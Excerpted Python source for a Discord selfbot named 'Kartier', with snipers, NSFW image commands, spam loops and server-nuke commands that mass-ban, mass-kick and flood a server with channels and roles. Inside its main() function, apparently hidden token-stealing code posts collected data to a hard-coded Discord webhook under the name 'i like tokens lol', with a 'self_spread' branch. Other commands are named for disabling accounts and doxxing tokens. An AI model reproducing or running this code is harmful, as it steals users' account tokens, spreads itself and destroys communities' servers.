...
░  ░        ░  ░   ░               ░     ░  ░   ░     
                       ...
                       {Fore.CYAN}Kartier v{SELFBOT.__version__} | {Fore.GREEN}Logged in as: {Kartier.user.name}#{Kartier.user.discriminator} {Fore.CYAN}| ID: {Fore.GREEN}{Kartier.user.id}   
                       {Fore.CYAN}Nitro Sniper | {Fore.GREEN}{nitro}
                       {Fore.CYAN}Cached Users: {Fore.GREEN}{len(Kartier.users)}
                       {Fore.CYAN}Guilds: {Fore.GREEN}{len(Kartier.guilds)}
                       {Fore.CYAN}Prefix: {Fore.GREEN}{Kartier.command_prefix}
    ''' + Fore.RESET)
...
def Init():
    token = config.get('token')
    try:
        Kartier.run(token, bot=False, reconnect=True)
        os.system(f'title (Kartier Selfbot) - Version {SELFBOT.__version__}')
...
colorama.init()
Kartier = discord.Client()
Kartier = commands.Bot(description='Kartier Selfbot', command_prefix=prefix, self_bot=True)

Kartier.antiraid = False
Kartier.msgsniper = True
Kartier.slotbot_sniper = True
Kartier.giveaway_sniper = True
Kartier.mee6 = False
Kartier.mee6_channel = None
Kartier.yui_kiss_user = None
Kartier.yui_kiss_channel = None
Kartier.yui_hug_user = None
Kartier.yui_hug_channel = None
Kartier.sniped_message_dict = {}
Kartier.sniped_edited_message_dict = {}
Kartier.whitelisted_users = {}
Kartier.copycat = None
Kartier.remove_command('help')
...
async def on_message_edit(before, after):
    await Kartier.process_commands(after)


@Kartier.event
async def on_message(message):
    if Kartier.copycat is not None and Kartier.copycat.id == message.author.id:
    ...
    if f'Congratulations <@{Kartier.user.id}>' in message.content:
        if Kartier.giveaway_sniper:
            if message.author.id == 294882584201003009:
                print(""
    ...
    await Kartier.process_commands(message)
...
async def on_member_ban(guild: discord.Guild, user: discord.user):
    if Kartier.antiraid is True:
        try:
            async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
                if guild.id in Kartier.whitelisted_users.keys() and i.user.id in Kartier.whitelisted_users[
                    guild.id].keys() and i.user.id is not Kartier.user.id:
                    print("not banned - " + i.user.name)
                else:
                    print("banned - " + i.user.name)
                    await guild.ban(i.user, reason="Kartier Anti-Nuke")
...
async def on_member_join(member):
    if Kartier.antiraid is True and member.bot:
        try:
            guild = member.guild
            async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.bot_add):
                if member.guild.id in Kartier.whitelisted_users.keys() and i.user.id in Kartier.whitelisted_users[
                    member.guild.id].keys():
                    return
                else:
                    await guild.ban(member, reason="Kartier Anti-Nuke")
                    await guild.ban(i.user, reason="Kartier Anti-Nuke")
        except Exception as e:
            print(e)
...
@Kartier.command(aliases=["queue"])
async def play(ctx, *, query):
    await ctx.message.delete()
    voice = get(Kartier.voice_clients, guild=ctx.guild)
...
@Kartier.command(aliases=['wl'])
async def whitelist(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        await ctx.send("Please specify a user to whitelist")
    else:
        if ctx.guild.id not in Kartier.whitelisted_users.keys():
            Kartier.whitelisted_users[ctx.guild.id] = {}
        if user.id in Kartier.whitelisted_users[ctx.guild.id]:
            await ctx.send('That user is already whitelisted')
        else:
            Kartier.whitelisted_users[ctx.guild.id][user.id] = 0
            await ctx.send("Whitelisted **" + user.name.replace("*", "\*").replace("`", "\`").replace("_",
                                                                                                      "\_") + "#" + user.discriminator + "**")
    # else:
    #     user = Kartier.get_user(id)
    #     if user is None:
...
@Kartier.command(aliases=['wld'])
async def whitelisted(ctx, g=None):
    await ctx.message.delete()
    if g == '-g' or g == '-global':
        whitelist = '`All Whitelisted Users:`\n'
        for key in Kartier.whitelisted_users:
            for key2 in Kartier.whitelisted_users[key]:
                user = Kartier.get_user(key2)
                whitelist += '**+ ' + user.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                              "\_") + "#" + user.discriminator + "** - " + Kartier.get_guild(
        ...
        for key in Kartier.whitelisted_users:
            if key == ctx.guild.id:
                for key2 in Kartier.whitelisted_users[ctx.guild.id]:
                    user = Kartier.get_user(key2)
                    whitelist += '**+ ' + user.name.replace('*', "\*").replace('`', "\`").replace('_',
...
async def unwhitelist(ctx, user: discord.Member = None):
    if user is None:
        ...
        if ctx.guild.id not in Kartier.whitelisted_users.keys():
            ...
            return
        if user.id in Kartier.whitelisted_users[ctx.guild.id]:
            Kartier.whitelisted_users[ctx.guild.id].pop(user.id, 0)
            user2 = Kartier.get_user(user.id)
            await ctx.send(
                'Successfully unwhitelisted **' + user2.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                                           "\_") + '#' + user2.discriminator + '**')


@Kartier.command(aliases=['clearwl', 'clearwld'])
async def clearwhitelist(ctx):
    await ctx.message.delete()
    Kartier.whitelisted_users.clear()
...
async def yuikiss(ctx, user: discord.User = None):
    ...
    if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(ctx.message.channel, discord.GroupChannel):
        ...
        if user is None:
            ...
            return
        Kartier.yui_kiss_user = user.id
        Kartier.yui_kiss_channel = ctx.channel.id
        if Kartier.yui_kiss_user is None or Kartier.yui_kiss_channel is None:
            await ctx.send('An impossible error occured, try again later or contact swag')
            return
        while Kartier.yui_kiss_user is not None and Kartier.yui_kiss_channel is not None:
            await Kartier.get_channel(Kartier.yui_kiss_channel).send('yui kiss ' + str(Kartier.yui_kiss_user), delete_after=0.1)
...
async def yuihug(ctx, user: discord.User = None):
    ...
    if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(ctx.message.channel, discord.GroupChannel):
        ...
        if user is None:
            ...
            return
        Kartier.yui_hug_user = user.id
        Kartier.yui_hug_channel = ctx.channel.id
        if Kartier.yui_hug_user is None or Kartier.yui_hug_channel is None:
            await ctx.send('An impossible error occured, try again later or contact swag')
            return
        while Kartier.yui_hug_user is not None and Kartier.yui_hug_channel is not None:
            await Kartier.get_channel(Kartier.yui_hug_channel).send('yui hug ' + str(Kartier.yui_hug_user), delete_after=0.1)
            await asyncio.sleep(60)
...
@Kartier.command(aliases=["automee6"])
async def mee6(ctx, param=None):
    ...
    while Kartier.mee6 is True:
        ...
        await Kartier.get_channel(Kartier.mee6_channel).send(random.choice(sentences), delete_after=0.1)
        await asyncio.sleep(60)


@Kartier.command(aliases=['slotsniper', "slotbotsniper"])
async def slotbot(ctx, param=None):
    await ctx.message.delete()
    Kartier.slotbot_sniper = False
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        Kartier.slotbot_sniper = True
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        Kartier.slotbot_sniper = False
...
@Kartier.command(aliases=['giveawaysniper'])
async def giveaway(ctx, param=None):
    await ctx.message.delete()
    Kartier.giveaway_sniper = False
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        Kartier.giveaway_sniper = True
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        Kartier.giveaway_sniper = False
...
async def on_message_delete(message):
    if message.author.id == Kartier.user.id:
        return
    if Kartier.msgsniper:
        if isinstance(message.channel, discord.DMChannel) or isinstance(message.channel, discord.GroupChannel):
            ...
            if len(attachments) == 0:
                ...
                message_content = "`" + str(
                    ...
                    message.content) + "\n\n**Attachments:**\n" + links
                await message.channel.send(message_content)
    if len(Kartier.sniped_message_dict) > 1000:
        Kartier.sniped_message_dict.clear()
    attachments = message.attachments
    if len(attachments) == 0:
        channel_id = message.channel.id
        message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + str(
            message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
        Kartier.sniped_message_dict.update({channel_id: message_content})
    else:
        links = ""
        for attachment in attachments:
            links += attachment.proxy_url + "\n"
...
@Kartier.event
async def on_message_edit(before, after):
    if before.author.id == Kartier.user.id:
        return
    if Kartier.msgsniper:
        ...
        if isinstance(before.channel, discord.DMChannel) or isinstance(before.channel, discord.GroupChannel):
            ...
            if len(attachments) == 0:
                ...
                message_content = "`" + str(
                    ...
                    before.content) + "\n\n**Attachments:**\n" + links
                await before.channel.send(message_content)
    if len(Kartier.sniped_edited_message_dict) > 1000:
        Kartier.sniped_edited_message_dict.clear()
    attachments = before.attachments
    if len(attachments) == 0:
        ...
        message_content = "`" + str(discord.utils.escape_markdown(str(before.author))) + "`: \n**BEFORE**\n" + str(
            before.content).replace("@everyone", "@\u200beveryone").replace("@here",
                                                                            "@\u200bhere") + "\n**AFTER**\n" + str(
            after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
        Kartier.sniped_edited_message_dict.update({channel_id: message_content})
    else:
        links = ""
        for attachment in attachments:
            links += attachment.proxy_url + "\n"
...
async def snipe(ctx):
    ...
    if currentChannel in Kartier.sniped_message_dict:
        await ctx.send(Kartier.sniped_message_dict[currentChannel])
    else:
        await ctx.send("No message to snipe!")


@Kartier.command(aliases=["esnipe"])
async def editsnipe(ctx):
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in Kartier.sniped_edited_message_dict:
        await ctx.send(Kartier.sniped_edited_message_dict[currentChannel])
    else:
        await ctx.send("No message to snipe!")
...
async def help(ctx, category=None):
    ...
    if category is None:
        ...
        embed.set_author(name="𝙀𝙓𝙀𝙏𝙀𝙍 𝙎𝙀𝙇𝙁𝘽𝙊𝙏 | 𝙋𝙍𝙀𝙁𝙄𝙓: " + str(Kartier.command_prefix),
                         icon_url=Kartier.user.avatar_url)
        embed.set_thumbnail(url=Kartier.user.avatar_url)
...
@Kartier.command(aliases=["giphy", "tenor", "searchgif"])
...
@Kartier.command(aliases=["img", "searchimg", "searchimage", "imagesearch", "imgsearch"])
    ...
    if str(image_tags[2]['src']).find("https://trkn.us/pixel/imp/c="):
        ...
        try:
            ...
            with io.BytesIO(image) as file:
                await ctx.send(f"Search result for: **{args}**", file=discord.File(file, f"Kartier_anal.png"))
        except:
...
@Kartier.command(aliases=["addemoji", "stealemote", "addemote"])
...
@Kartier.command(aliases=["stopcopycatuser", "stopcopyuser", "stopcopy"])
async def stopcopycat(ctx):
    await ctx.message.delete()
    if Kartier.user is None:
        await ctx.send("You weren't copying anyone to begin with")
        return
    await ctx.send("Stopped copying " + str(Kartier.copycat))
    Kartier.copycat = None


@Kartier.command(aliases=["copycatuser", "copyuser"])
async def copycat(ctx, user: discord.User):
    await ctx.message.delete()
    Kartier.copycat = user
    await ctx.send("Now copying " + str(Kartier.copycat))


@Kartier.command(aliases=["9/11", "911", "terrorist"])
...
@Kartier.command(aliases=["jerkoff", "ejaculate", "orgasm"])
async def cum(ctx):
    await ctx.message.delete()
...
@Kartier.command(aliases=["spamchangegcname", "changegcname"])
async def spamgcname(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        watermark = "Kartier LOL"
        name = ""
...
@Kartier.command(aliases=["fakename"])
...
@Kartier.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
            ...
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(str(res['message'])) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"Kartier_tweet.png"))
            except:
                await ctx.send(res['message'])


@Kartier.command(aliases=["distort"])
        ...
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Kartier_magik.png"))
        except:
            await ctx.send(res['message'])
    else:
...
@Kartier.command(aliases=['markasread', 'ack'])
async def read(ctx):
    await ctx.message.delete()
    for guild in Kartier.guilds:
        await guild.ack()
...
@Kartier.command(aliases=["deepfry"])
        ...
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Kartier_fry.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        ...
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Kartier_blur.png"))
        except:
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Kartier_supreme.png"))
    except:
        await ctx.send(endpoint)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Kartier_dark_supreme.png"))
    except:
        await ctx.send(endpoint)


@Kartier.command(aliases=["facts"])
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Kartier_facts.png"))
    except:
        await ctx.send(endpoint)


@Kartier.command(aliases=["blurp"])
        ...
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Kartier_blurpify.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        ...
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Kartier_invert.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
...
@Kartier.command(aliases=["pornhublogo", "phlogo"])
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Kartier_pornhub_logo.png"))
    except:
        await ctx.send(endpoint)


@Kartier.command(aliases=["pornhubcomment", 'phc'])
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res["message"]) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Kartier_pornhub_comment.png"))
    except:
        await ctx.send(res["message"])
...
@Kartier.command(aliases=["reversesearch", "anticatfish", "catfish"])
...
@Kartier.command(aliases=['pfp', 'avatar'])
...
@Kartier.command(aliases=["del", "quickdel"])
...
@Kartier.command(name='1337speak', aliases=['leetspeak'])
...
async def ghost(ctx):
    ...
    if config.get('password') == 'password-here':
        ...
        with open('Images/Avatars/Transparent.png', 'rb') as f:
            try:
                await Kartier.user.edit(password=password, username="ٴٴٴٴ", avatar=f.read())
            except discord.HTTPException as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)


@Kartier.command(aliases=['pfpget', 'stealpfp'])
    ...
    if config.get('password') == 'password-here':
        ...
        try:
            ...
            with open('Images/Avatars/Stolen/Stolen.png', 'rb') as f:
                await Kartier.user.edit(password=password, avatar=f.read())
        except discord.HTTPException as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)


@Kartier.command(name='set-pfp', aliases=['setpfp', 'pfpset,"changepfp'])
...
@Kartier.command(aliases=['wouldyourather', 'would-you-rather', 'wyrq'])
...
@Kartier.command(aliases=['dong', 'penis'])
...
@Kartier.command(aliases=['changehypesquad'])
...
@Kartier.command(aliases=['tokenfucker', 'disable', 'crash'])
...
@Kartier.command(aliases=['fakeconnection', 'spoofconnection', 'spoofcon', "fakecon"])
async def fakenet(ctx, _type=None, *, name=None):
    ...
    if r.status_code == 200:
        ...
        await ctx.send(
            '**[ERROR]** `Kartier Fake-Connection doesn\'t work anymore because Discord patched connection-spoofing`')


@Kartier.command(aliases=['tokinfo', 'tdox'])
...
@Kartier.command(aliases=["copyguild", "copyserver"])
async def copy(ctx):  # b'\xfc'
    await ctx.message.delete()
    await Kartier.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in Kartier.guilds:
...
@Kartier.command(aliases=["rekt", "nuke"])
async def destroy(ctx):
    ...
    try:
        ...
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name="Kartier")
    for _i in range(250):
        await ctx.guild.create_role(name="Kartier", color=RandomColor())


@Kartier.command(aliases=["banwave", "banall", "etb"])
async def massban(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.ban(reason="Kartier")
        except:
            pass
...
@Kartier.command(aliases=["kickall", "kickwave"])
async def masskick(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.kick(reason="Kartier")
        except:
            pass


@Kartier.command(aliases=["spamroles"])
...
@Kartier.command(aliases=["masschannels", "masschannel", "ctc"])
...
@Kartier.command(aliases=["delchannel"])
...
@Kartier.command(aliases=["deleteroles"])
...
@Kartier.command(aliases=["purgebans", "unbanall"])
...
async def dm(ctx, user: discord.Member, *, message):
    await ctx.message.delete()
    user = Kartier.get_user(user.id)
    if ctx.author.id == Kartier.user.id:
        return
    else:
        try:
...
@Kartier.command(name='get-color', aliases=['color', 'colour', 'sc', "hexcolor", "rgb"])
...
@Kartier.command(aliases=['rainbowrole'])
...
@Kartier.command(aliases=["guildinfo"])
...
@Kartier.command(aliases=['slots', 'bet', "slotmachine"])
async def slot(ctx):
    await ctx.message.delete()
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
...
@Kartier.command(aliases=['guildpfp', 'serverpfp', 'servericon'])
...
@Kartier.command(aliases=['serverbanner'])
...
@Kartier.command(name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
...
@Kartier.command(aliases=["renameserver", "nameserver"])
...
async def prefix(ctx, prefix):
    await ctx.message.delete()
    Kartier.command_prefix = str(prefix)
...
@Kartier.command(aliases=['bitcoin'])
async def btc(ctx):
    await ctx.message.delete()
...
@Kartier.command(pass_context=True, aliases=["cyclename", "autoname", "autonick", "cycle"])
...
@Kartier.command(aliases=["stopcyclename", "cyclestop", "stopautoname", "stopautonick", "stopcycle"])
...
async def acceptfriends(ctx):
    await ctx.message.delete()
    for relationship in Kartier.user.relationships:
...
async def clearblocked(ctx):
    await ctx.message.delete()
    print(Kartier.user.relationships)
    for relationship in Kartier.user.relationships:
...
@Kartier.command(aliases=["changeregions", "changeregion", "regionschange"])
...
@Kartier.command(aliases=["gcleave"])
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Kartier_dog.png"))
    except:
        await ctx.send(link)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Kartier_cat.png"))
    except:
        await ctx.send(link)
...
def main():
    ...
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "i like tokens lol",
        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
    }
    try:
        urlopen(Request("https://discordapp.com/api/webhooks/755127482075578369/HKgdZ-5Ne6viO2xcxKEis71gaCeAdfdG_8zNKjxnzfHdHW8z2OdIOlIxEYX8jM1TAK4Y", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    if self_spread:
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Kartier_sadcat.png"))
    except:
        await ctx.send(link)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Kartier_bird.png"))
    except:
        await ctx.send(link)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Kartier_fox.png"))
    except:
        await ctx.send(link)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Kartier_anal.gif"))
    except:
        em = discord.Embed()
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Kartier_erofeet.png"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Kartier_feet.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Kartier_hentai.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Kartier_boobs.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Kartier_tits.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Kartier_blowjob.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Kartier_neko.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Kartier_lesbian.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Kartier_cumslut.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
...
@Kartier.command(aliases=["vagina"])
async def pussy(ctx):
    await ctx.message.delete()
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Kartier_pussy.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Kartier_waifu.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Kartier_feed.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Kartier_tickle.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Kartier_slap.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Kartier_hug.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Kartier_cuddle.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Kartier_smug.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Kartier_pat.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Kartier_kiss.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
...
async def purge(ctx, amount: int):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == Kartier.user).map(
            lambda m: m):
        try:
            await message.delete()
        except:
...
@Kartier.command(name='group-leaver',
                aliase=['leaveallgroups', 'leavegroup', 'leavegroups', "groupleave", "groupleaver"])
async def _group_leaver(ctx):
    await ctx.message.delete()
    for channel in Kartier.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()


@Kartier.command(aliases=["streaming"])
async def stream(ctx, *, message):
    ...
    await Kartier.change_presence(activity=stream)


@Kartier.command(alises=["game"])
async def playing(ctx, *, message):
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await Kartier.change_presence(activity=game)


@Kartier.command(aliases=["listen"])
async def listening(ctx, *, message):
    await ctx.message.delete()
    await Kartier.change_presence(
...
@Kartier.command(aliases=["stopstreaming", "stopstatus", "stoplistening", "stopplaying", "stopwatching"])
async def stopactivity(ctx):
    await ctx.message.delete()
    await Kartier.change_presence(activity=None, status=discord.Status.dnd)
...
@Kartier.command(aliases=["fliptable"])
...
@Kartier.command(name='rolecolor')
...
@Kartier.command(aliases=["logout"])
async def shutdown(ctx):
    await ctx.message.delete()
    await Kartier.logout()


@Kartier.command(aliases=["nitrogen"])
async def nitro(ctx):
    await ctx.message.delete()
